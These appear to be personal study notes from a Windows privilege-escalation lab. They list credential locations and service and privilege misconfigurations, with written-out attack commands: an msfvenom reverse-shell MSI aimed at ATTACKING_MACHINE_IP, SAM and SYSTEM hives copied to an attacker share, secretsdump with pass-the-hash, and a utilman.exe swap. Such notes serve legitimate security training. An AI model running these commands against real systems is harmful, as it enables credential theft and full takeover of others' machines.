Common weaknesses:
- Misconfigurations on Windows services or scheduled tasks.
- Excessive privileges assigned to out account.
- Vulnerable software.
- Missing Windows security patches.

**Windows Users**
- **Administrators**: These users have the most privileges. 
- **Standard Users**: Can perform limited tasks.
Any user with administrative privileges will be part of the **Administrators** group. Standard users are part of the **Users** group.

There are, also, special built-in accounts used by the operating system:
- **System / LocalSystem**: Used by the OS to perform internal tasks. It has access to all files and resources available on the host with even higher privileges than administrators.
- **Local Service**: Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
- **Network Service**: Used to run services with "minimum" privileges. It will use the computer credentials to authenticate through the network.


# Unattended Windows Installation
When installing Windows on a large number of hosts, the administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These installations are called Unattended Installations. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations: 
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
# Powershell History

If a user runs a command that includes a password directly as part of the Powershell command line, it can be retrieved by using the following command from a cmd.exe prompt:
``type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt``

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

# Saved Windows Credentials 

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system.
```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
```

# IIS Configuration

internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. We can find `web.config` in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
# Retrieve Credentials from Software


**PuTTY**

To retrieve the stored proxy credentials, tou can search under the following registry key for ProxyPassword with the following command:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

# Scheduled Tasks

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

```shell-session
schtasks /query /tn vulntask /fo list /v
```

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`.

## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

We can use `msfvenom` to generate a malicious.msi file:
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```shell-session
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

# Windows Services
Windows services are managed by the **Service Control Manager** (SCM).
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
We can query services using the command `sc qc <service_name>`.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker.
All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`

### Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

### Unquoted Service Paths
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.
From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

### Insecure Service Permissions

Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.

## SeBackup /SeRestore

Those privileges allow users to read an write to any file in the system, ignoring any DACL (Discretionary Access Control Lists).

To backup the SAM and SYSTEM hashes, we can use the following commands:

```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

Then we can create a new smbserver on our computer and create a share. After this, we can use the copy command in our windows machine to transfer both files to our kali computer.

```shell
 copy C:\Users\sam.hive \\ATTACKER_IP\public\
```

Then use impacket-secretsdump to retrieve the users password  hashes:

```shell
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges.
```shell
impacket-psexec -hashes <hash> administrator@<win-machine-ip>
```

SeTakeOwnerShip
This privilege allows a user to take ownership of any object on the system, including files and registry keys.

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like.

To replace utilman, we will start by taking ownership of it with the following command:


```shell
C:\> takeown /f C:\Windows\System32\Utilman.exe
```
To give your user full permissions over utilman.exe you can use the following command:

```shell
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
```
After this, we will replace utilman.exe with a copy of cmd.exe:

```shell
C:\Windows\System32\> copy cmd.exe utilman.exe
```
o trigger utilman, we will lock our screen from the start button.

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges.

# SeImpersonate / SeAssignPrimaryToken
These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

# Unpatched Software
We can use `wmic` tool to list software installed on the target system and its version.
```shell
wmic product get name,version,vendor
```

# Tools
#### WinPeas
Is a script that enumerate the target system to uncover privilege escalation paths.
#### PrivescCheck
Is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a bin file.
To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet.

#### WES-NG: Windows Exploit Suggester - Next Generation
Exploiting suggesting scripts will require you to upload them to the target system and run them there. This cause antivirus software to detect them. You may prefer using WES-NG, which will run on your attacking machine.
To use the script, you will need to run the `systeminfo` command on the target system. Then use the output on `wes.py`
```bash
wes.py systeminfo.txt
```

#### Metasploit
If you already have a Meterpreter [[shell]] on the target, you can use `multi/recon/local_exploit_suggester` module.
